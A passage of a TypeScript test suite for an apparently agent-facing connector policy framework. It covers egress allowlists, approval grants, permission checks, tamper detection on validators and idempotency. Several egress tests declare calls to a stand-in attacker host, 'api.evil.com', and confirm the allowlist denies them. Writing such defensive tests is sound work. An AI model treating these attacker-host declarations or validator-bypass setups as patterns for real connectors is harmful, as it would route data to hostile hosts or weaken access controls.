    const outputTool = createConnector<unknown, { ok: boolean }>({
      id: 'direct.mutated-output-validator',
      description: 'Reject an in-place output validator mutation',
      outputSchema: z.object({ ok: z.boolean() }),
      execute: outputExecute,
      permissions: { sideEffect: 'read' },
    });
    mutateValidator(outputTool.outputSchema, () => ({
      value: { ok: false },
    }));
    await expect(invokeConnector(outputTool, {})).rejects.toThrow(
      'invokeConnector refuses a connector whose execution boundary was modified after construction',
    );
    expect(outputExecute).not.toHaveBeenCalled();
  });

  it('rejects in-place mutation of a callable Standard Schema validator', async () => {
    const schema = Object.assign(() => undefined, {
      '~standard': {
        version: 1 as const,
        vendor: 'breakwater-callable-test',
        validate: (value: unknown) => ({ value: String(value) }),
        jsonSchema: {
          input: () => ({ type: 'string' }),
          output: () => ({ type: 'string' }),
        },
      },
    }) as unknown as PublicSchema<string>;
    const execute = vi.fn(async (value: string) => value);
    const tool = createConnector<string, string>({
      id: 'direct.mutated-callable-validator',
      description: 'Reject a callable schema validator mutation',
      inputSchema: schema,
      execute,
      permissions: { sideEffect: 'read' },
    });
    (
      tool.inputSchema as unknown as {
        '~standard': { validate: (value: unknown) => { value: unknown } };
      }
    )['~standard'].validate = () => ({ value: 'bypassed' });

    await expect(invokeConnector(tool, 'untrusted')).rejects.toThrow(
      'invokeConnector refuses a connector whose execution boundary was modified after construction',
    );
    expect(execute).not.toHaveBeenCalled();
  });

  it('contains throwing accessors on a modified execution boundary', async () => {
    const accessorSecret = 'private-execute-accessor-6d59ef';
    const execute = vi.fn(async () => ({ ok: true }));
    const tool = createConnector<unknown, { ok: boolean }>({
      id: 'direct.throwing-execute-accessor',
      description: 'Contain an execute accessor installed after construction',
      execute,
      permissions: { sideEffect: 'read' },
    });
    Object.defineProperty(tool, 'execute', {
      configurable: true,
      get() {
        throw new Error(accessorSecret);
      },
    });

    const failure = await invokeConnector(tool, {}).catch(
      (error: unknown) => error,
    );
    expect(failure).toBeInstanceOf(TypeError);
    expect(failure).toMatchObject({
      message:
        'invokeConnector refuses a connector whose execution boundary was modified after construction',
    });
    expect(exposedErrorText(failure)).not.toContain(accessorSecret);
    expect(execute).not.toHaveBeenCalled();
  });

  it('rethrows connector policy and application errors unchanged', async () => {
    const policyError = new ConnectorPolicyError(
      'direct.policy-error',
      'custom-policy',
      'application-owned denial',
    );
    const policyTool = createConnector<unknown, unknown>({
      id: 'direct.policy-error',
      description: 'Throw an application-owned connector policy error',
      execute: async () => ({}),
      permissions: { sideEffect: 'read' },
      policies: {
        evaluators: [
          {
            name: 'custom-policy',
            evaluate: async () => {
              throw policyError;
            },
          },
        ],
      },
    });
    await expect(invokeConnector(policyTool, {})).rejects.toBe(policyError);

    const applicationError = new Error('application-owned failure');
    const applicationTool = createConnector<unknown, unknown>({
      id: 'direct.application-error',
      description: 'Throw an application error',
      execute: async () => {
        throw applicationError;
      },
      permissions: { sideEffect: 'read' },
    });
    await expect(invokeConnector(applicationTool, {})).rejects.toBe(
      applicationError,
    );
  });
});

describe('network egress gate', () => {
  it('denies execution when a declared domain is not allowlisted', async () => {
    // #given
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'read', egress: ['api.evil.com'] },
      policies: {
        networkEgress: { allowedDomains: ['api.salesforce.com'] },
        audit,
      },
    });
    // #when
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('network-egress');
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        action: 'connector.execute',
        resource: 'salesforce.createContact',
        decision: 'denied',
        detail: { policy: 'network-egress', sideEffect: 'read' },
      },
    ]);
  });

  it('runs when every declared domain is allowlisted', async () => {
    // #given
    const { tool, execute } = makeConnector({
      permissions: {
        sideEffect: 'read',
        egress: ['api.salesforce.com', 'login.salesforce.com'],
      },
      policies: {
        networkEgress: {
          allowedDomains: ['*.salesforce.com'],
        },
      },
    });
    // #when / #then
    expect(await run(tool, input)).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('does not gate egress when no networkEgress policy is bound', async () => {
    // #given
    const { tool } = makeConnector({
      permissions: { sideEffect: 'read', egress: ['api.anywhere.com'] },
    });
    // #when / #then
    expect(await run(tool, input)).toEqual({ ok: true });
  });
});

describe('custom tool-boundary evaluators', () => {
  it('denies when a custom evaluator rejects the call', async () => {
    // #given
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      policies: {
        audit,
        evaluators: [
          {
            name: 'quiet-hours',
            evaluate: () => ({ allowed: false, reason: 'outside 9-5' }),
          },
        ],
      },
    });
    // #when
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('quiet-hours');
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'denied', detail: { policy: 'quiet-hours' } },
    ]);
  });

  it('runs custom evaluators after the built-in egress gate in order', async () => {
    // #given
    const order: string[] = [];
    const evaluator = (name: string) => ({
      name,
      evaluate: () => {
        order.push(name);
        return { allowed: true as const };
      },
    });
    const { tool } = makeConnector({
      permissions: { sideEffect: 'read', egress: ['api.salesforce.com'] },
      policies: {
        networkEgress: { allowedDomains: ['api.salesforce.com'] },
        evaluators: [evaluator('custom-1'), evaluator('custom-2')],
      },
    });
    // #when
    await run(tool, input);
    // #then
    expect(order).toEqual(['custom-1', 'custom-2']);
  });

  it('denies via egress before custom evaluators run', async () => {
    // #given
    const custom = vi.fn(() => ({ allowed: true as const }));
    const { tool } = makeConnector({
      permissions: { sideEffect: 'read', egress: ['api.evil.com'] },
      policies: {
        networkEgress: { allowedDomains: ['api.salesforce.com'] },
        evaluators: [{ name: 'custom', evaluate: custom }],
      },
    });
    // #when
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then
    expect((failure as ConnectorPolicyError).policy).toBe('network-egress');
    expect(custom).not.toHaveBeenCalled();
  });

  it('passes the tool-call context to custom evaluators', async () => {
    // #given
    let seen: unknown;
    const { tool } = makeConnector({
      permissions: { sideEffect: 'write', egress: ['api.salesforce.com'] },
      policies: {
        evaluators: [
          {
            name: 'capture',
            evaluate: (context) => {
              seen = context;
              return { allowed: true };
            },
          },
        ],
      },
    });
    // #when
    await run(tool, input);
    // #then
    expect(seen).toMatchObject({
      connectorId: 'salesforce.createContact',
      sideEffect: 'write',
      egress: ['api.salesforce.com'],
      input: { email: 'ada@example.com' },
    });
  });

  it('enforces crossWorkflowIsolation end-to-end through policies.evaluators', async () => {
    // #given — the isolation evaluator registered in the reserved slot; the
    // caller's scope is runtime-minted into requestContext
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      inputSchema: z.object({ workflowId: z.string().optional() }),
      permissions: { sideEffect: 'read' },
      policies: {
        audit,
        evaluators: [
          crossWorkflowIsolation({
            targetScopeOf: (call) =>
              (call.input as { workflowId?: string }).workflowId,
          }),
        ],
      },
    });
    const context = makeContext();
    context.requestContext?.set(WORKFLOW_SCOPE_CONTEXT_KEY, 'wf-a');

    // #when — a call addressing ANOTHER workflow's state
    const failure = await run(tool, { workflowId: 'wf-b' }, context).catch(
      (error: unknown) => error,
    );

    // #then — denied via the standard evaluator gate, audited
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe(
      'cross-workflow-isolation',
    );
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'denied', detail: { policy: 'cross-workflow-isolation' } },
    ]);

    // #then — the same call scoped to its own workflow executes
    expect(await run(tool, { workflowId: 'wf-a' }, context)).toEqual({
      ok: true,
    });
  });

  it('fails closed when a custom evaluator crashes', async () => {
    // #given
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      policies: {
        audit,
        evaluators: [
          {
            name: 'flaky',
            evaluate: () => {
              throw new Error(PRIVATE_BACKEND_SENTINEL);
            },
          },
        ],
      },
    });
    // #when / #then
    await expect(run(tool, input)).rejects.toThrow(PRIVATE_BACKEND_SENTINEL);
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        reason: 'flaky evaluator failed',
        detail: { policy: 'flaky' },
      },
    ]);
    expect(JSON.stringify(audit.events())).not.toContain(
      PRIVATE_BACKEND_SENTINEL,
    );
  });
});

describe('write permission gate', () => {
  it('denies a destructive call with no grant outside an agent run', async () => {
    // #given
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'destructive' },
      policies: { audit },
    });
    // #when
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('write-permissions');
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'denied', detail: { policy: 'write-permissions' } },
    ]);
  });

  it('runs a destructive call when the request carries a grant', async () => {
    // #given
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'destructive' },
    });
    const context = makeContext({
      approved: ['salesforce.createContact'],
    });
    // #when / #then
    expect(await run(tool, input, context)).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it.each([
    ['connector', { connectorId: 'salesforce.otherCall' }],
    ['workflow', { grantWorkflowId: 'workflow-2' }],
    ['run', { grantRunId: 'tenant_run-2' }],
    ['tenant', { grantIsolationScope: 'other-tenant' }],
    ['step', { grantStepPath: ['other-gate'] }],
    ['suspension', { grantSuspendedAt: 999 }],
    ['resume count', { grantResumeCount: 1 }],
    ['tool call', { grantToolCallId: 'call-2' }],
  ] as const)('denies a tool-call grant with the wrong %s identity', async (_field, options) => {
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'destructive' },
    });

    await expect(
      run(tool, input, makeToolCallGrantContext(options)),
    ).rejects.toThrow(ConnectorPolicyError);
    expect(execute).not.toHaveBeenCalled();
  });

  it('fails closed for legacy connector arrays and malformed structured grants', async () => {
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'destructive' },
    });
    const legacyOnly = makeToolCallGrantContext({
      grants: ['salesforce.createContact'],
    });
    const mixed = makeToolCallGrantContext({
      grants: [
        {
          scope: 'tool-call',
          connectorId: 'salesforce.createContact',
          workflowId: 'workflow-1',
          runId: 'tenant_run-1',
          isolationScope: 'tenant',
          suspension: {
            stepPath: ['gate'],
            suspendedAt: 1_000,
            resumeCount: 2,
          },
          toolCallId: 'call-1',
        },
        { connectorId: 'malformed' },
      ],
    });
    const legacyAlongsideStructured = makeToolCallGrantContext({
      legacyGrant: ['salesforce.createContact'],
    });

    for (const context of [legacyOnly, mixed, legacyAlongsideStructured]) {
      await expect(run(tool, input, context)).rejects.toThrow(
        ConnectorPolicyError,
      );
    }
    expect(execute).not.toHaveBeenCalled();
  });

  it('keeps retry authority on the same toolCallId but denies a new call identity', async () => {
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'destructive' },
    });
    const approvedAttempt = makeToolCallGrantContext();

    expect(await run(tool, input, approvedAttempt)).toEqual({ ok: true });
    expect(await run(tool, input, approvedAttempt)).toEqual({ ok: true });
    await expect(
      run(
        tool,
        input,
        makeToolCallGrantContext({ agentToolCallId: 'call-retried-by-model' }),
      ),
    ).rejects.toThrow(ConnectorPolicyError);
    expect(execute).toHaveBeenCalledTimes(2);
  });

  it('authorizes an explicit run-scoped grant independently of suspension grants', async () => {
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'destructive' },
    });
    const requestContext = new RequestContext();
    requestContext.set(WORKFLOW_SCOPE_CONTEXT_KEY, 'workflow-1');
    requestContext.set('runId', 'tenant_run-1');
    requestContext.set(ISOLATION_SCOPE_CONTEXT_KEY, 'tenant');
    requestContext.set(CONNECTOR_EXECUTION_CONTEXT_KEY, {
      kind: 'start',
      workflowId: 'workflow-1',
      runId: 'tenant_run-1',
      isolationScope: 'tenant',
    });
    requestContext.set(CONNECTOR_GRANTS_CONTEXT_KEY, [
      {
        scope: 'run',
        connectorId: 'salesforce.createContact',
        workflowId: 'workflow-1',
        runId: 'tenant_run-1',
        isolationScope: 'tenant',
      },
    ]);

    expect(
      await run(tool, input, {
        requestContext,
      } as unknown as ToolExecutionContext),
    ).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('audits effective grant scope and identity without connector input', async () => {
    const audit = new AuditLogger();
    const { tool } = makeConnector({
      permissions: { sideEffect: 'destructive' },
      policies: { audit },
    });
    const privateInput = { email: PRIVATE_BACKEND_SENTINEL };

    await run(tool, privateInput, makeToolCallGrantContext());

    expect(audit.events()).toContainEqual(
      expect.objectContaining({
        action: 'connector.approval',
        resource: 'salesforce.createContact',
        decision: 'allowed',
        detail: expect.objectContaining({
          grantScope: 'tool-call',
          workflowId: 'workflow-1',
          runId: 'tenant_run-1',
          stepPath: ['gate'],
          suspendedAt: 1_000,
          resumeCount: 2,
          toolCallId: 'call-1',
        }),
      }),
    );
    expect(JSON.stringify(audit.events())).not.toContain(
      PRIVATE_BACKEND_SENTINEL,
    );
  });

  it('ignores grants for other connectors', async () => {
    // #given
    const { tool } = makeConnector({
      permissions: { sideEffect: 'destructive' },
    });
    const context = makeContext({ approved: ['salesforce.somethingElse'] });
    // #when
    const failure = await run(tool, input, context).catch(
      (error: unknown) => error,
    );
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('write-permissions');
  });

  it('requires a grant even under an agent-run context', async () => {
    // #given — an agent-shaped context is forwardable into nested and
    // direct calls, so it is no proof that Mastra's native approval ran for
    // THIS call; the grant is the only approval token
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'destructive' },
    });
    // #when / #then
    await expect(
      run(tool, input, makeContext({ agent: true })),
    ).rejects.toThrow(ConnectorPolicyError);
    expect(execute).not.toHaveBeenCalled();
    expect(
      await run(
        tool,
        input,
        makeContext({ agent: true, approved: ['salesforce.createContact'] }),
      ),
    ).toEqual({ ok: true });
  });

  it('does not let a forwarded agent context bypass the grant', async () => {
    // #given — a composite tool forwards the agent context it received into
    // a nested destructive connector; Mastra's approval loop only ever saw
    // the OUTER tool call, so the inner call must still require a grant
    const inner = makeConnector({
      permissions: { sideEffect: 'destructive' },
    });
    const composite = createConnector({
      id: 'crm.cleanupPipeline',
      description: 'Composite cleanup calling a nested connector',
      execute: async (_input, context) => run(inner.tool, input, context),
      permissions: { sideEffect: 'read' },
    });
    // #when — the outer tool's valid grant is forwarded too. It must not become
    // a wildcard for the inner connector even though the tool-call identity
    // and exact suspension leg are otherwise unchanged.
    const denied = await run(
      composite,
      input,
      makeContext({
        agent: true,
        approved: ['crm.cleanupPipeline'],
      }),
    ).catch((error: unknown) => error);
    // #then
    expect(denied).toBeInstanceOf(ConnectorPolicyError);
    expect((denied as ConnectorPolicyError).connector).toBe(
      'salesforce.createContact',
    );
    expect((denied as ConnectorPolicyError).policy).toBe('write-permissions');
    expect(inner.execute).not.toHaveBeenCalled();
  });

  it('gates writes matched by the org glob policy', async () => {
    // #given
    const { tool } = makeConnector({
      policies: { writePermissions: { requireApproval: ['salesforce.*'] } },
    });
    // #when / #then
    await expect(run(tool, input)).rejects.toThrow(ConnectorPolicyError);
    expect(
      await run(
        tool,
        input,
        makeContext({ approved: ['salesforce.createContact'] }),
      ),
    ).toEqual({ ok: true });
  });

  it('leaves unmatched writes ungated', async () => {
    // #given
    const { tool } = makeConnector({
      policies: { writePermissions: { requireApproval: ['github.*'] } },
    });
    // #when / #then
    expect(await run(tool, input)).toEqual({ ok: true });
  });

  it('honors the destructive opt-out', async () => {
    // #given
    const { tool } = makeConnector({
      permissions: { sideEffect: 'destructive' },
      policies: {
        writePermissions: { destructiveRequiresApproval: false },
      },
    });
    // #when / #then
    expect(await run(tool, input)).toEqual({ ok: true });
  });
});

describe('required-permissions gate', () => {
  const REQUIRED = ['contacts.write', 'crm.access'] as const;
  const PRIVATE_EFFECTIVE_SENTINEL = 'privatebackend.effectiveonly';

  function permissionConnector(
    overrides: Partial<Parameters<typeof createConnector>[0]> = {},
  ) {
    return makeConnector({
      permissions: { sideEffect: 'read', requiredPermissions: REQUIRED },
      ...overrides,
    });
  }

  it.each([
    ['a non-array', 'contacts.write'],
    ['an empty list', []],
    ['a duplicate identifier', ['contacts.write', 'contacts.write']],
    ['a malformed identifier', ['Contacts.write']],
    ['a non-string entry', ['contacts.write', 42]],
  ])('rejects a manifest declaring %s at construction', (_label, requiredPermissions) => {
    expect(() =>
      makeConnector({
        permissions: {
          sideEffect: 'read',
          requiredPermissions:
            requiredPermissions as unknown as readonly string[],
        },
      }),
    ).toThrow(/permissions\.requiredPermissions/);
  });

  it('exposes the frozen requiredPermissions via connectorManifest()', () => {
    const { tool } = permissionConnector();
    const manifest = connectorManifest(tool);
    expect(manifest?.requiredPermissions).toEqual([...REQUIRED]);
    expect(Object.isFrozen(manifest?.requiredPermissions)).toBe(true);
  });

  it('runs when the projection holds every required permission, tolerating duplicates and extras', async () => {
    // #given
    const audit = new AuditLogger();
    const { tool, execute } = permissionConnector({ policies: { audit } });
    const context = makeContext({
      principalPermissions: {
        permissions: [
          'contacts.write',
          'contacts.write',
          'crm.access',
          'unrelated.extra',
        ],
        policyVersion: 'permissions-v7',
      },
    });
    // #when / #then
    expect(await run(tool, input, context)).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(1);
    expect(audit.events()).toMatchObject([
      {
        action: 'connector.authorize',
        decision: 'allowed',
        detail: {
          policy: 'required-permissions',
          requiredPermissions: [...REQUIRED],
          permissionPolicyVersion: 'permissions-v7',
        },
      },
      { action: 'connector.execute', decision: 'allowed' },
    ]);
  });

  it('denies when any one required permission is absent and audits the policy snapshot without effective-authority leakage', async () => {
    // #given — the projection holds one required permission plus a private
    // effective-only identifier that must never appear in audit
    const audit = new AuditLogger();
    const { tool, execute } = permissionConnector({ policies: { audit } });
    const context = makeContext({
      principalPermissions: {
        permissions: ['contacts.write', PRIVATE_EFFECTIVE_SENTINEL],
        policyVersion: 'permissions-v8',
      },
    });
    // #when
    const failure = await run(tool, input, context).catch(
      (error: unknown) => error,
    );
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe(
      'required-permissions',
    );
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        decision: 'denied',
        detail: {
          policy: 'required-permissions',
          requiredPermissions: [...REQUIRED],
          permissionPolicyVersion: 'permissions-v8',
        },
      },
    ]);
    expect(JSON.stringify(audit.events())).not.toContain(
      PRIVATE_EFFECTIVE_SENTINEL,
    );
    expect((failure as ConnectorPolicyError).message).not.toContain(
      PRIVATE_EFFECTIVE_SENTINEL,
    );
  });

  it.each([
    ['no projection at all', undefined],
    ['a null projection (explicit host retirement)', null],
    ['a non-object projection', 'contacts.write'],
    ['an array projection', ['contacts.write']],
    [
      'a non-array permission set',
      { permissions: 'contacts.write', policyVersion: 'v1' },
    ],
    [
      'a malformed permission identifier',
      { permissions: ['Contacts.write'], policyVersion: 'v1' },
    ],
    [
      'a non-string permission entry',
      { permissions: ['contacts.write', 42], policyVersion: 'v1' },
    ],
    [
      'a blank policy version',
      { permissions: [...REQUIRED], policyVersion: '   ' },
    ],
    [
      'a control-character policy version',
      { permissions: [...REQUIRED], policyVersion: '\n' },
    ],
    [
      'a policy version over the 200-character bound',
      { permissions: [...REQUIRED], policyVersion: 'v'.repeat(201) },
    ],
    ['a missing policy version', { permissions: [...REQUIRED] }],
  ])('fails closed for %s', async (_label, principalPermissions) => {
    // #given
    const audit = new AuditLogger();
    const { tool, execute } = permissionConnector({ policies: { audit } });
    // #when
    const failure = await run(
      tool,
      input,
      makeContext({ principalPermissions }),
    ).catch((error: unknown) => error);
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe(
      'required-permissions',
    );
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        decision: 'denied',
        detail: {
          policy: 'required-permissions',
          requiredPermissions: [...REQUIRED],
          permissionPolicyVersion: null,
        },
      },
    ]);
  });

  it('ignores the projection entirely on a connector that declares no required permissions', async () => {
    // #given — garbage under the key must not affect an undeclared manifest
    const { tool, execute } = makeConnector();
    const context = makeContext({
      principalPermissions: { permissions: 'garbage', policyVersion: 42 },
    });
    // #when / #then
    expect(await run(tool, input, context)).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('a nested connector call cannot broaden authority: the inner requirement is checked against the same projection', async () => {
    // #given — the outer connector is authorized; the nested one requires a
    // permission the projection does not hold
    const inner = makeConnector({
      id: 'payments.release',
      permissions: {
        sideEffect: 'read',
        requiredPermissions: ['payments.release'],
      },
    });
    const composite = createConnector({
      id: 'crm.settleAccount',
      description: 'Composite settlement calling a nested connector',
      execute: async (_input, context) => run(inner.tool, input, context),
      permissions: {
        sideEffect: 'read',
        requiredPermissions: ['contacts.write'],
      },
    });
    const context = makeContext({
      principalPermissions: {
        permissions: ['contacts.write'],
        policyVersion: 'permissions-v9',
      },
    });
    // #when
    const denied = await run(composite, input, context).catch(
      (error: unknown) => error,
    );
    // #then
    expect(denied).toBeInstanceOf(ConnectorPolicyError);
    expect((denied as ConnectorPolicyError).connector).toBe('payments.release');
    expect((denied as ConnectorPolicyError).policy).toBe(
      'required-permissions',
    );
    expect(inner.execute).not.toHaveBeenCalled();
  });

  it('denies an unauthorized dry-run request: a simulation still needs an authorized principal', async () => {
    // #given
    const dryRunExecute = vi.fn(async () => ({ ok: true, simulated: true }));
    const { tool, execute } = permissionConnector({
      permissions: {
        sideEffect: 'write',
        requiredPermissions: REQUIRED,
        dryRun: true,
      },
      dryRunExecute,
    });
    // #when
    const failure = await run(tool, input, makeContext({ dryRun: true })).catch(
      (error: unknown) => error,
    );
    // #then — denied by authorization, not by the dry-run branch
    expect((failure as ConnectorPolicyError).policy).toBe(
      'required-permissions',
    );
    expect(dryRunExecute).not.toHaveBeenCalled();
    expect(execute).not.toHaveBeenCalled();
  });

  it('an authorized dry-run still simulates without an approval grant', async () => {
    // #given
    const dryRunExecute = vi.fn(async () => ({ ok: true, simulated: true }));
    const { tool, execute } = permissionConnector({
      permissions: {
        sideEffect: 'write',
        requiredPermissions: REQUIRED,
        requiresApproval: true,
        dryRun: true,
      },
      dryRunExecute,
    });
    const context = makeContext({
      dryRun: true,
      principalPermissions: {
        permissions: [...REQUIRED],
        policyVersion: 'permissions-v10',
      },
    });
    // #when / #then
    expect(await run(tool, input, context)).toEqual({
      ok: true,
      simulated: true,
    });
    expect(dryRunExecute).toHaveBeenCalledTimes(1);
    expect(execute).not.toHaveBeenCalled();
  });

  it('a valid approval grant does not elevate an unauthorized principal', async () => {
    // #given — the write gate WOULD pass (exact structured grant), but the
    // principal is not authorized to invoke this connector at all
    const audit = new AuditLogger();
    const { tool, execute } = permissionConnector({
      permissions: {
        sideEffect: 'destructive',
        requiredPermissions: REQUIRED,
      },
      policies: { audit },
    });
    const context = makeContext({
      approved: ['salesforce.createContact'],
      principalPermissions: {
        permissions: ['contacts.write'],
        policyVersion: 'permissions-v11',
      },
    });
    // #when
    const failure = await run(tool, input, context).catch(
      (error: unknown) => error,
    );
    // #then — denied by authorization BEFORE the grant is even consulted
    expect((failure as ConnectorPolicyError).policy).toBe(
      'required-permissions',
    );
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events().map((event) => event.action)).not.toContain(
      'connector.approval',
    );
  });

  it('a satisfied permission gate does not replace the approval grant', async () => {
    // #given — authorization passes, approval is still missing
    const audit = new AuditLogger();
    const { tool, execute } = permissionConnector({
      permissions: {
        sideEffect: 'destructive',
        requiredPermissions: REQUIRED,
      },
      policies: { audit },
    });
    const context = makeContext({
      principalPermissions: {
        permissions: [...REQUIRED],
        policyVersion: 'permissions-v12',
      },
    });
    // #when
    const failure = await run(tool, input, context).catch(
      (error: unknown) => error,
    );
    // #then — the authorize event fired, then the write gate denied
    expect((failure as ConnectorPolicyError).policy).toBe('write-permissions');
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { action: 'connector.authorize', decision: 'allowed' },
      { decision: 'denied', detail: { policy: 'write-permissions' } },
    ]);
  });
});

describe('gate ordering', () => {
  it('denies via egress before the approval gate', async () => {
    // #given — both gates would deny; egress must fire first
    const audit = new AuditLogger();
    const { tool } = makeConnector({
      permissions: { sideEffect: 'destructive', egress: ['api.evil.com'] },
      policies: {
        networkEgress: { allowedDomains: ['api.salesforce.com'] },
        audit,
      },
    });
    // #when
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then
    expect((failure as ConnectorPolicyError).policy).toBe('network-egress');
    expect(audit.events()).toHaveLength(1);
  });

  it('denies via approval before reading the idempotency store', async () => {
    // #given
    const get = vi.fn(() => undefined);
    const { tool } = makeConnector({
      permissions: { sideEffect: 'destructive', idempotencyKey: true },
      policies: { idempotencyStore: { get, put: () => {} } },
    });
    // #when
    const failure = await run(
      tool,
      input,
      makeContext({ idempotencyKey: 'k1' }),
    ).catch((error: unknown) => error);
    // #then
    expect((failure as ConnectorPolicyError).policy).toBe('write-permissions');
    expect(get).not.toHaveBeenCalled();
  });

  it('denies via egress before the required-permissions gate', async () => {
    // #given — both gates would deny; the evaluator loop must fire first
    const audit = new AuditLogger();
    const { tool } = makeConnector({
      permissions: {
        sideEffect: 'read',
        egress: ['api.evil.com'],
        requiredPermissions: ['contacts.write'],
      },
      policies: {
        networkEgress: { allowedDomains: ['api.salesforce.com'] },
        audit,
      },
    });
    // #when
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then
    expect((failure as ConnectorPolicyError).policy).toBe('network-egress');
    expect(audit.events()).toHaveLength(1);
  });

  it('denies via required-permissions before reading the idempotency store or consuming rate budget', async () => {
    // #given — an unauthorized keyed call: no store read, no budget spend
    const get = vi.fn(() => undefined);
    const increment = vi.fn(() => 1);
    const { tool } = makeConnector({
      permissions: {
        sideEffect: 'write',
        requiredPermissions: ['contacts.write'],
        idempotencyKey: true,
        rateLimit: '100/min',
      },
      policies: {
        idempotencyStore: { get, put: () => {} },
        rateLimitStore: { increment },
      },
    });
    // #when
    const failure = await run(
      tool,
      input,
      makeContext({ idempotencyKey: 'k1' }),
    ).catch((error: unknown) => error);
    // #then
    expect((failure as ConnectorPolicyError).policy).toBe(
      'required-permissions',
    );
    expect(get).not.toHaveBeenCalled();
    expect(increment).not.toHaveBeenCalled();
  });
});

describe('idempotency', () => {
  it('requires a bound store at definition time', () => {
    // #when / #then
    expect(() =>
      makeConnector({
        permissions: { sideEffect: 'write', idempotencyKey: true },
      }),
    ).toThrow(TypeError);
  });

  it('denies calls that omit the idempotency key', async () => {
    // #given
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    });
    // #when
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('idempotency');
    expect(execute).not.toHaveBeenCalled();
  });

  it('replays the stored result instead of re-executing', async () => {
    // #given
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore(), audit },
    });
    // #when
    const first = await run(tool, input, makeContext({ idempotencyKey: 'k1' }));
    const second = await run(
      tool,
      input,
      makeContext({ idempotencyKey: 'k1' }),
    );
    // #then
    expect(execute).toHaveBeenCalledTimes(1);
    expect(second).toEqual(first);
    expect(audit.events()).toMatchObject([
      { decision: 'allowed', detail: { idempotencyKey: 'k1' } },
      { decision: 'allowed', detail: { replayed: true, idempotencyKey: 'k1' } },
    ]);
  });

  it('replays stored undefined results', async () => {
    // #given
    const execute = vi.fn(async (): Promise<undefined> => undefined);
    const tool = createConnector({
      id: 'mailer.send',
      description: 'Send mail',
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    });
    // #when
    await run(tool, {}, makeContext({ idempotencyKey: 'k1' }));
    // #then
    expect(
      await run(tool, {}, makeContext({ idempotencyKey: 'k1' })),
    ).toBeUndefined();
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('executes again under a different key', async () => {
    // #given
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    });
    // #when
    await run(tool, input, makeContext({ idempotencyKey: 'k1' }));
    await run(tool, input, makeContext({ idempotencyKey: 'k2' }));
    // #then
    expect(execute).toHaveBeenCalledTimes(2);
  });

  it('replays through a Promise-returning store', async () => {
    // #given
    const entries = new Map<string, IdempotencyRecord>();
    const store: IdempotencyStore = {
      get: async (key) => entries.get(key),
      put: async (key, record) => {
        entries.set(key, record);
      },
    };
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    // #when
    const first = await run(tool, input, makeContext({ idempotencyKey: 'k1' }));
    const second = await run(
      tool,
      input,
      makeContext({ idempotencyKey: 'k1' }),
    );
    // #then
    expect(second).toEqual(first);
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('does not commit invalid output to a non-atomic replay store', async () => {
    // #given — a same-isolate custom store and a connector that violates its
    // declared output contract
    const entries = new Map<string, IdempotencyRecord>();
    const store: IdempotencyStore = {
      get: (key) => entries.get(key),
      put: vi.fn((key, record) => {
